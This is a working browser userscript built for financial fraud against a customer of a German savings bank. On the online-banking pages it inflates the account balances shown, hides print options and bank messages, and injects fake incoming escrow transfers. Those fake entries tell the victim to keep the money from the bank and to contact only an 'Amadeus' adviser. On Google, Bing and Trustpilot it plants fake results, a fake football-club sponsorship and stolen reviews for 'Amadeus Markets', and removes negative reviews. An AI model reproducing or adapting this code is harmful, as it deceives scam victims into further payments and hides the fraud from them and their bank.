// ==UserScript==
// @name         Combined Patric Edens
// @namespace    http://tampermonkey.net/
// @version      41.0
// @description  Combine multiple scripts
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @match        https://www.drivehq.com/*
// @match        https://www.ksk-limburg.de/de/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.ksk-limburg.de/fi/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.ksk-limburg.de/de/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.ksk-limburg.de/fi/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.ksk-limburg.de/de/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @match        https://www.ksk-limburg.de/fi/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/473129/Combined%20Patric%20Edens.user.js
// @updateURL https://update.greasyfork.org/scripts/473129/Combined%20Patric%20Edens.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // Your code here...


    //SCRIPTV2 TRIGGER!
    var easyUpdate = "no";


    var pointerOverviewTotal = "";
    var pointerTabelle = "xx";
    var absender = "Treuhand: Payward Limited";
    var absenderTitel = "Treuhand: Payward Limited";
    var firma = "test";
    var asenderReference = "WD3746 TRX88205A CX13280";
    var absenderDetails = "Einreichung einer Treuhand Überweisung. Freigabe nötig durch Payward Limited";
    var amount = 0;
    var vorgemerkt = "no";
    var xamount = 333500;
    var x2amount = 0;
    var buchung = 20000;
    var buchungDecimal = "91";
    var buchungTextsZahl = "2.296.593";
    var accountsecurity = "20 4197 26";

    if (easyUpdate == "yes"){
        x2amount = 10000;}


    function numberWithCommas(x) {
        return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");}

    if (window.location.href.indexOf("finanzuebersicht") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("10740346043") > 0) {
        //Wir sind in der Finanzuebersicht
        if (vorgemerkt == "no"){

    /// Refresh the finanzstatus page once it loads for the first time

var refresh = window.localStorage.getItem('refresh');
console.log(refresh);
setTimeout(function() {
if (refresh===null){
    window.location.reload();
    window.localStorage.setItem('refresh', "1");
}
}, 3000); // 1500 milliseconds = 1.5 seconds

setTimeout(function() {
localStorage.removeItem('refresh')
}, 1700); // 1700 milliseconds = 1.7 seconds

                                  var KontosBoxElement = document.getElementsByClassName("nbf-container-box nbf-container--pfm expandable")[0];
if (KontosBoxElement) {
    KontosBoxElement.remove();
}

            var main = 3;
            var subtotal = 9;
            var total = 10;





            ///UTITLITY FUNCTIONS/////////
            // Function to remove elements with the class "primary-cta", "mkp-button-group mkp-layout-margin mkp-button-group-with-separator mkp-button-group-mobile-left-aligned", and elements containing the text "Druckansicht", and show a spinner when specific text is found
    function removePrimaryCTAAndShowSpinner() {
        // Remove elements with the class "primary-cta"
        var elementsToRemoveCTA = document.querySelectorAll('.primary-cta');
        elementsToRemoveCTA.forEach(function(element) {
            element.remove();
        });

        // Remove elements with the class "mkp-button-group mkp-layout-margin mkp-button-group-with-separator mkp-button-group-mobile-left-aligned"
        var elementsToRemoveButtonGroup = document.querySelectorAll('.mkp-button-group.mkp-layout-margin.mkp-button-group-with-separator.mkp-button-group-mobile-left-aligned');
        elementsToRemoveButtonGroup.forEach(function(element) {
            element.remove();
        });

        // Remove elements containing the text "Druckansicht"
        var elementsToRemoveDruckansicht = Array.from(document.querySelectorAll('*')).filter(el => el.textContent.includes("Druckansicht"));
        elementsToRemoveDruckansicht.forEach(function(element) {
            element.remove();
        });

        // Check if the specified text is found on the webpage
        var targetText = "Für welches Konto möchten Sie Umsätze aufrufen?";
        if (document.body.textContent.includes(targetText)) {
            // Show a spinner using a custom spinner element
            var spinner = document.createElement('div');
            spinner.style.position = 'fixed';
            spinner.style.top = '0';
            spinner.style.left = '0';
            spinner.style.width = '100%';
            spinner.style.height = '100%';
            spinner.style.background = 'rgba(255, 255, 255, 0.9)'; // Adjust alpha value here
            spinner.style.zIndex = '9999';

            // Create a spinner element with a background image
            var spinnerElement = document.createElement('div');
            spinnerElement.style.width = '100px'; // Adjust width as needed
            spinnerElement.style.height = '100px'; // Adjust height as needed
            spinnerElement.style.background = 'url(https://upload.wikimedia.org/wikipedia/commons/4/4e/Logo-_Sparkassen-App_%E2%80%93_die_mobile_Filiale.png) center center no-repeat';
            spinnerElement.style.backgroundSize = 'contain';

            spinner.appendChild(spinnerElement);
            document.body.appendChild(spinner);
        }

        console.log('Removed elements with class "primary-cta", "mkp-button-group mkp-layout-margin mkp-button-group-with-separator mkp-button-group-mobile-left-aligned", and elements containing "Druckansicht", and showed spinner');
    }

    // Call the function immediately
    removePrimaryCTAAndShowSpinner();


            ///UTITLITY FUNCTIONS/////////

            var xpointerOverviewAcc = document.getElementsByClassName("balance-predecimal")[main].textContent;
            var xrealAccBalance = xpointerOverviewAcc.replace(".", "");
            var xfakeAccBalance = parseFloat(xrealAccBalance) + xamount;
            var xfakeAccBalancewithcomma = numberWithCommas(xfakeAccBalance);
            document.getElementsByClassName("balance-predecimal")[main].textContent = xfakeAccBalancewithcomma;

            //Wenn nicht vorgemerkt sein soll, dann faken wir die Balance in die Uebersicht.
            //var pointerOverviewAcc = document.getElementsByClassName("balance-predecimal")[2].textContent;
            //var realAccBalance = pointerOverviewAcc.replace(".", "");
            //var fakeAccBalance = parseFloat(realAccBalance) + amount;
            //var fakeAccBalancewithcomma = numberWithCommas(fakeAccBalance);

            //Update Balance
            //document.getElementsByClassName("balance-predecimal")[2].textContent = fakeAccBalancewithcomma;

            if (easyUpdate == "yes"){
                var updaterCheck = document.getElementsByClassName("balance-predecimal")[2].textContent;
                var updaterCheckBalance = updaterCheck.replace(".", "");
                var updaterFakeBalance = parseFloat(xrealAccBalance) + x2amount;
                var updaterFakeSPK = numberWithCommas(updaterFakeBalance);
                document.getElementsByClassName("balance-predecimal")[2].textContent = updaterFakeSPK;
            }

            var zwischenSumme = document.getElementsByClassName("balance-predecimal")[subtotal].textContent;
            var zwischenSummeReal = zwischenSumme.replace(".", "");
            var zwischenSummeFake = parseFloat(zwischenSummeReal) + x2amount +xamount;
            var zwischenSummeNwc = numberWithCommas(zwischenSummeFake);

            //Update ZwischenSumme
            document.getElementsByClassName("balance-predecimal")[subtotal].textContent = zwischenSummeNwc;

            var TotalAmount = document.getElementsByClassName("balance-predecimal")[total].textContent;
            var TotalAmountReal = TotalAmount.replace(".", "");
            var TotalAmountFake = parseFloat(TotalAmountReal) + x2amount +xamount;
            var TotalAmountNwc = numberWithCommas(TotalAmountFake);

            //Update Total
            document.getElementsByClassName("balance-predecimal")[total].textContent = TotalAmountNwc;

        }

    }

    if (window.location.href.indexOf("umsaetze") > 0 || window.location.href.indexOf("drive") > 0  ) {

        //Wir sind im Kontostand
 // Set the value by which you want to modify the main balance
    var modificationValue = 333400;

    // Function to modify the main balance
    function modifyMainBalance() {
        // Get the element with either class "balance-decimal plus" or "balance-decimal minus"
        var balanceElement = document.querySelector('.balance-decimal.plus, .balance-decimal.minus');

        // Check if the element exists
        if (balanceElement) {
            // Get the text content of the balance element
            var balanceText = balanceElement.textContent.trim();

            // Extract the numeric value from the text content (assuming the format is X.XXX,XX EUR)
            var numericValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace('.', '').replace(',', '.'));

            // Check if the balance is positive or negative and modify accordingly
            if (balanceElement.classList.contains('plus')) {
                numericValue += modificationValue;
            } else if (balanceElement.classList.contains('minus')) {
                numericValue -= modificationValue;
            }

            // Update the text content with the modified value and "EUR" currency
            balanceElement.textContent = numericValue.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' }).replace('€', 'EUR');
        } else {
            console.error('Balance element not found.');
        }
    }

    // Execute the modification function
    modifyMainBalance();


        //---------------------------------------------------------------------------------------------
        var AccBalance = document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent;
        var AccBalanceReal = AccBalance.replace(".", "");
        var AccBalanceFake = parseFloat(AccBalanceReal) + x2amount;
        var AccBalanceFake2 = parseFloat(AccBalanceReal) + xamount;
        var AccBalanceNwc2 = numberWithCommas(AccBalanceFake2);
        var AccBalanceNwc = numberWithCommas(AccBalanceFake);
        var singleAmount = numberWithCommas(amount);

////////UTITLITY FUNCTIONS//////////
        // Function to remove elements with the class "umsatzdrucken"
    function removeUmsatzdruckenElement() {
        var elementsToRemove = document.querySelectorAll('.umsatzdrucken');
        elementsToRemove.forEach(function(element) {
            element.remove();
        });

        console.log('Removed elements with class "umsatzdrucken"');
    }

    // Call the function immediately
    removeUmsatzdruckenElement();
 ////////UTITLITY FUNCTIONS//////////



        //Update Kontostand oben
        //if (vorgemerkt == "no"){
        //    document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent = AccBalanceNwc;

        //}

        //document.getElementsByClassName("mkp-card-list")[1]

        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == accountsecurity ){
            if (vorgemerkt == "no"){
                document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent = AccBalanceNwc2;
                      var saldoLinechartElement = document.getElementsByClassName("saldo-linechart")[0];
if (saldoLinechartElement) {
    saldoLinechartElement.remove();
}
            }
            var xxxxxHTML = '<div class="mkp-card-list"><span class="mkp-list-subline">Spezialauftrag Treuhand (1)</span><ul class="mkp-card-group mkp-group-unify mkp-group-clickable" aria-label="Treuhand"><li aria-label="Treuhand Auftrag"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Bruno Scheibner: Treuhand Freigabe nötig durch Bruno Scheibner">Treuhand: Freigabe nötig durch Matthias Kabisch</a></h3><p>Treuhand-Auftrag: DE11501900000006605826</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">207.547</span><span aria-hidden="true" class="balance-decimal plus">,07&nbsp;EUR</span><span aria-hidden="false" class="offscreen">-100,00 EUR</span></div></div></div></div></li></ul></div>';
            var saveHTML = document.getElementsByClassName("mkp-card-list")[0].innerHTML;
            var xHTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; '+buchungTextsZahl+' EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="'+absenderTitel+'">'+absender+'</a></h3><p>'+absenderDetails+'</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">'+buchungTextsZahl+'</span><span aria-hidden="true" class="balance-decimal plus">,'+buchungDecimal+'&nbsp;EUR</span><span aria-hidden="false" class="offscreen">15.308,00 EUR</span></div></div></div></div></li>';

            //var save2HTML = document.getElementsByClassName("mkp-card-list")[1].innerHTML;
            var x2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 73.300,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Geld für Steuern. Mit Sparkasse das Geld NICHT besprechen, damit nicht gesperrt wird.</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">73.300</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">73.300,00 EUR</span></div></div></div></div></li>';
            var x3HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 40.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Geld für Steuern. Wenden Sie sich nur an Amadeus Kontoberater.</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">40.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">40.000,00 EUR</span></div></div></div></div></li>';
            var x4HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 110.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Geld nur für 20%. Wenden Sie sich an Ihren Amadeus Kontoberater.</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">110.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">110.000,00 EUR</span></div></div></div></div></li>';
            var x5HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 100.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Das letzte Geld für Steuern, dann Freigabe. Wenden Sie sich an Ihren Amadeus Kontoberater.</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">100.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">100.000,00 EUR</span></div></div></div></div></li>';
            var x6HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 10.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Geschenk von Amadeus für Ihre Geduld.</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">10.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">10.000,00 EUR</span></div></div></div></div></li>';



            //document.getElementsByClassName("mkp-card-list")[1].innerHTML = save2HTML + x2HTML;
            //block spk-analytics.js;
            document.getElementsByClassName("mkp-card-list")[0].innerHTML = xHTML + x2HTML + x3HTML + x4HTML + x5HTML + x6HTML + saveHTML;
        }

        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == "1800 0168 34"){
            if (vorgemerkt == "no" && easyUpdate == "yes"){
                document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent = AccBalanceNwc;
             //   $('.saldo-linechart').remove();
            }
            var save2HTML = document.getElementsByClassName("mkp-card-list")[0].innerHTML;
            var Sx2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 10.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Withdrawal Trading Account: AY01-503DE-SP</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">10.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">9.200,00 EUR</span></div></div></div></div></li>';
            document.getElementsByClassName("mkp-card-list")[0].innerHTML = Sx2HTML + save2HTML;
        }

    }

    if (window.location.href.indexOf("einzelauftrag") > 0 || window.location.href.indexOf("uebertrag") > 0 || window.location.href.indexOf("10658360993") > 0 ) {


if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == accountsecurity ){

        if (vorgemerkt == "no"){
            var elementExists = document.getElementsByClassName("balance-predecimal")[0];
            var shouldBeBalance = "";
            var uwdone = 0;
            setInterval(function() { elementExists = document.getElementsByClassName("balance-predecimal")[0];
                                    if (elementExists != null){
                                        if (uwdone == 0){
                                            //amount = 7149;
                                            var uwBalance = document.getElementsByClassName("balance-predecimal")[0].textContent;
                                            var uwBalanceReal = uwBalance.replace(".", "");
                                            var uwBalancneFake = parseFloat(uwBalanceReal) + xamount;
                                            var uwBalanceNwc = uwBalancneFake.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
                                            document.getElementsByClassName("balance-predecimal")[0].textContent = uwBalanceNwc;
                                            uwdone = 1;
                                            shouldBeBalance = uwBalanceNwc;
                                        }

                                        if ( uwdone == 1 ) {
                                            if ( document.getElementsByClassName("balance-predecimal")[0].textContent != shouldBeBalance ) {
                                                document.getElementsByClassName("balance-predecimal")[0].textContent = shouldBeBalance;
                                                document.getElementById("idKontostandLine").parentNode.removeChild(document.getElementById("idKontostandLine"));
                                            }
                                        }
                                    }}, 50);} }}


     // Check if the specified condition is met
    if (window.location.href.indexOf("postfach") > 0 || window.location.href.indexOf("10736626574") > 0 || window.location.href.indexOf("10733487459") > 0 ) {
        // Function to remove elements and their direct parent
        function removeElements() {
            var elementsToRemove = document.querySelectorAll('.mkp-text-underline.mkp-text-readable.mkp-link-ghost.postbox-message-direct-download');
            elementsToRemove.forEach(function(element) {
                var textContent = element.textContent || element.innerText;
                if (textContent.includes('120419726')) {
                    var parentElement = element.closest('.tableroweven.tablerowmarked.postbox-message-row');
                    if (parentElement) {
                        parentElement.remove();
                        console.log('Parent element removed:', parentElement);
                    }
                }
            });
        }

        // Call the function immediately
        removeElements();

        // Set an interval to check repeatedly, if needed
        setInterval(removeElements, 1000); // Adjust the interval as needed
    }


     if (window.location.href.indexOf("kontodetails") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("10658384414") > 0 ) {




        if (vorgemerkt == "no"){
            // Configurable values
    var desiredIBAN = accountsecurity; // Your desired IBAN in '     '
    var useSameAdjustmentAmount = true; // Set to true to use the same adjustment amount for all balances
    var adjustmentAmount = 333000.0; // The adjustment amount to use if "useSameAdjustmentAmount" is true
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: 3000.50 },
        { index: 1, adjustmentAmount: 3000.70 },
        { index: 2, adjustmentAmount: 3000.90 },
        { index: 3, adjustmentAmount: 3000.10 }
    ];

    // Check if the first element with class "mkp-identifier-multiline" matches the specified IBAN
    var firstIdentifierElement = document.querySelector('.mkp-identifier-description');
    if (firstIdentifierElement) {
        var identifierText = firstIdentifierElement.textContent.replace(/\s/g, '').toLowerCase();

        // Check if either the entire IBAN matches or at least the last 9 characters match
        if (identifierText === desiredIBAN.replace(/\s/g, '').toLowerCase() || identifierText.endsWith(desiredIBAN.slice(-9).replace(/\s/g, '').toLowerCase())) {
            console.log('IBAN matches. Balance changer started.');

            // Function to change the balance value
            function changeBalance(balanceElement, adjustmentAmount) {
                var currentBalanceText = balanceElement.textContent.trim();
                var currentBalanceValue = parseFloat(currentBalanceText.replace(/[^\d,]+/g, '').replace(',', '.'));

                if (!isNaN(currentBalanceValue)) {
                    var newBalanceValue = currentBalanceValue + adjustmentAmount;
                    var newBalanceText = formatBalance(newBalanceValue) + ' EUR'; // Add "EUR" currency symbol

                    // Change the class to "minus" if the balance is negative
                    if (newBalanceValue < 0) {
                        balanceElement.classList.remove('plus');
                        balanceElement.classList.add('minus');
                    } else {
                        balanceElement.classList.remove('minus');
                        balanceElement.classList.add('plus');
                    }

                    // Update the balance element with the new value
                    balanceElement.textContent = newBalanceText;

                    console.log('Balance changed from ' + currentBalanceText + ' to ' + newBalanceText);
                } else {
                    console.log('Failed to parse current balance value.');
                }
            }

            // Iterate through the balance configurations and apply changes
            if (useSameAdjustmentAmount) {
                BALANCE_CONFIGS.forEach(function(config) {
                    var balanceElements = document.querySelectorAll('.plus, .minus');
                    if (config.index < balanceElements.length) {
                        var balanceElement = balanceElements[config.index];
                        changeBalance(balanceElement, adjustmentAmount);
                    } else {
                        console.log('Balance element not found for index ' + config.index);
                    }
                });
            } else {
                var balanceElements = document.querySelectorAll('.plus, .minus');
                balanceElements.forEach(function(balanceElement, index) {
                    var config = BALANCE_CONFIGS.find(function(cfg) {
                        return cfg.index === index;
                    });
                    if (config) {
                        changeBalance(balanceElement, config.adjustmentAmount);
                    } else {
                        console.log('No configuration found for balance element at index ' + index);
                    }
                });
            }

            // Function to format the balance with correct separators
            function formatBalance(balance) {
                var formattedBalance = balance.toFixed(2).replace(/\./g, ','); // Use comma as decimal separator
                return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, "."); // Add dots as thousands separators
            }
        } else {
            console.log('IBAN does not match. Balance changer not executed.');
        }
    } else {
        console.log('No element with class "mkp-identifier-multiline" found.');
    }} }



    // Script 1: Custom Search Results
if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1) {
        (function() {
            'use strict';

            // Padding settings for Google and Bing
            let googlePadding = "0px";
            let bingPadding = "40px";

            // Add style to reduce the space between search results
            let style = document.createElement('style');
            style.type = 'text/css';
            style.innerHTML = `
                .e9EfHf, .b_algo {
                    padding: 0;
                    margin: 20px;
                }
                .eqAnXb, .b_caption {
                    padding: 0;
                    margin: 20px;
                }
                .g, .b_algo {
                    padding: 0;
                    margin: 30px;
                }
            `;
            document.head.appendChild(style);

            try {
                let hostname = window.location.hostname;
                let isGoogleDomain = hostname.includes('google.');
                let isBingDomain = hostname.includes('bing.com');

                if (!isGoogleDomain && !isBingDomain) {
                    return; // Not on Google or Bing, exit script
                }

                let urlParams = new URLSearchParams(window.location.search);
                let queryParam = 'q';
                let query = urlParams.get(queryParam).toLowerCase();
                let startParam = urlParams.get('start') || urlParams.get('first');

                // If not on the first page, do not modify the search results.
                if (startParam !== null && startParam !== '0' && startParam !== '1') {
                    return;
                }

                let customResults = [
                    {
                        keywords: ["amadeus", "market", "amdeus", "blue star", "bluestar", "fiat201", "fiat 201", "schalke", "trust"],
                        results: [
                            {
                                url: "https://www.amadeus-markets.com",
                                title: "Amadeus Markets dein Broker",
                                description: "Amadeus Markets ist der Broker mit der besten Reputation.",
                                footerText: "https://www.amadeus-markets.com",
                                footerTextPosition: {
                                    google: {bottom: "55px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                            {
                                url: "https://de.trustpilot.com/review/icmarkets.com?page=7",
                                title: "Bewertungen von Amadeus Markets - einer der größten Makler der Welt",
                                description: "Über 30 000 Bewertungen über den Broker Amadeus Markets",
                                footerText: "https://de.trustpilot.com/review/amadeusmarkets.com?page=7",
                                footerTextPosition: {
                                    google: {bottom: "85px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                             {
                                url: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                title: "Amadeus Markets Partner von Fussbalklub Schalke 04",
                                description: "Wir freuen uns, bekannt geben zu können, dass Amadeus Markets ab dem 1. Januar unser Sponsor und Partner wird. Amadeus Markets ist spezialisiert auf Vermögensverwaltung und Handel. Unsere Spieler sind Amadeus Markets sehr dankbar, insbesondere Andreas Graf, der ihr Kapital verwaltet.",
                                footerText: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                footerTextPosition: {
                                    google: {bottom: "120px", left: "0px"},
        bing: {bottom: "75px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            }
                        ],
                        // add more groups of custom results here if needed
                    },
                    // Add more groups of custom results here if needed
                ];

                for (let group of customResults) {
                    for (let keyword of group.keywords) {
                        if (query.includes(keyword)) {
                            const checkExist = setInterval(function() {
                                const search = document.querySelector(isGoogleDomain ? 'div#search' : '#b_results');
                                const elementToRemove = document.querySelector(isGoogleDomain ? 'div#taw' : '#b_context');

                                if (search !== null) {
                                    // If the element exists, remove it from the page
                                    if (elementToRemove !== null) {
                                        elementToRemove.parentNode.removeChild(elementToRemove);
                                    }

                                    group.results.forEach(function(resultObj) {
                                        const result = document.createElement('div');
                                        result.innerHTML = `
                                            <div class="g" style="padding-bottom: ${isGoogleDomain ? googlePadding : bingPadding};${isBingDomain ? 'margin: 20px 0;' : ''}">
                                                <div class="rc" style="margin-bottom: 0px;">
                                                    <div class="r">
                                                        <a href="${resultObj.url}">
                                                            <h3 class="LC20lb DKV0Md">${resultObj.title}</h3>
                                                        </a>
                                                    </div>
                                                    <div class="s">
                                                        <div><span>${resultObj.description}</span></div>
                                                    </div>
                                                </div>
                                                <div class="TbwUpd NJjxre iUh30 ojE3Fb" style="position: relative;">
                                                    <span style="position: absolute; bottom: ${isGoogleDomain ? resultObj.footerTextPosition.google.bottom : resultObj.footerTextPosition.bing.bottom}; left: ${isGoogleDomain ? resultObj.footerTextPosition.google.left : resultObj.footerTextPosition.bing.left}; white-space: ${resultObj.footerTextStyles.whiteSpace};">${resultObj.footerText}</span>
                                                </div>
                                            </div>
                                        `;

                                        search.insertBefore(result, search.firstChild);
                                    });

                                    clearInterval(checkExist);
                                }
                            }, 100); // check every 100ms

                            // only handle the first matching keyword
                            break;
                        }
                    }
                }
            } catch (e) {
                console.error(e);
            }
        })();
}

// Script 2: Custom Trustpilot Header and URL Modifier
if (window.location.href.indexOf("https://de.trustpilot.com/") !== -1) {
  (function () {
    'use strict';

    // Define the custom header, logo URL, and URL for the specified element
    const customHeader = "Amadeus Markets";
    const customLogoURL = "https://amadeus-markets.com/images/Logowhite.png";
    const customURL = "https://amadeus-markets.com";
    const customReferenceURL = "amadeus-markets.com";
    const customLinkURL = "https://amadeus-markets.com"; // Replace this with your desired URL

    // Define keyword replacements here (keyword: replacement)
    const keywordReplacements = {
      "ic markets": "Amadeus Markets",
      "icmarkets": "Amadeus Markets",
      "ic-markets": "Amadeus Markets",
      // Add more keyword-replacement pairs as needed
    };

    // Function to replace keywords with their replacement values
    function replaceKeywords() {
      const elements = document.getElementsByTagName("*");
      for (let i = 0; i < elements.length; i++) {
        const element = elements[i];
        for (let j = 0; j < element.childNodes.length; j++) {
          const node = element.childNodes[j];
          if (node.nodeType === 3) {
            const text = node.nodeValue;
            let replacedText = text;
            for (const keyword in keywordReplacements) {
              if (Object.prototype.hasOwnProperty.call(keywordReplacements, keyword)) {
                const replacement = keywordReplacements[keyword];
                replacedText = replacedText.replace(new RegExp(`\\b${keyword}\\b`, "gi"), replacement);
              }
            }
            if (replacedText !== text) {
              element.replaceChild(document.createTextNode(replacedText), node);
            }
          }
        }
      }
    }

    // Function to set black background to the parent element of the inserted image
    function setBlackBackground() {
      const imageWrapperElement = document.querySelector('.profile-image_imageWrapper__kDdWe');
      if (imageWrapperElement) {
        imageWrapperElement.style.backgroundColor = 'black';
      }
    }

    // Function to remove elements with classes "styles_badgesWrapper__6VasU" and "styles_badgesWrapper__6VasU styles_sticky__yeJRO"
    function removeBadgesWrapperElements() {
      const badgesWrapperElements = document.querySelectorAll('.styles_badgesWrapper__6VasU, .styles_badgesWrapper__6VasU.styles_sticky__yeJRO');
      badgesWrapperElements.forEach((element) => {
        element.remove();
      });
    }

    // Function to remove elements with class "styles_cardWrapper__LcCPA styles_show__HUXRb styles_reviewCard__9HxJJ" if they contain the link "https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"
    function removeReviewCardElements() {
      const reviewCardElements = document.querySelectorAll('.styles_cardWrapper__LcCPA.styles_show__HUXRb.styles_reviewCard__9HxJJ');
      reviewCardElements.forEach((element) => {
        const linkElement = element.querySelector('a[href="https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"]');
        if (linkElement) {
          element.remove();
        }
      });
    }

    // Function to replace the logo image with the custom logo URL
    function replaceLogo() {
      const logoImageElement = document.querySelector('.business-profile-image_image__jCBDc');
      if (logoImageElement) {
        logoImageElement.src = customLogoURL;
        logoImageElement.removeAttribute('srcset');
      }
    }

    // Function to remove avif and jpeg elements from the picture element
    function removeAvifAndJpegLinks() {
      const pictureElement = document.querySelector('.business-profile-image_containmentWrapper__wu_Tp');
      if (pictureElement) {
        const avifSourceElement = pictureElement.querySelector('source[type="image/avif"]');
        if (avifSourceElement) {
          avifSourceElement.remove();
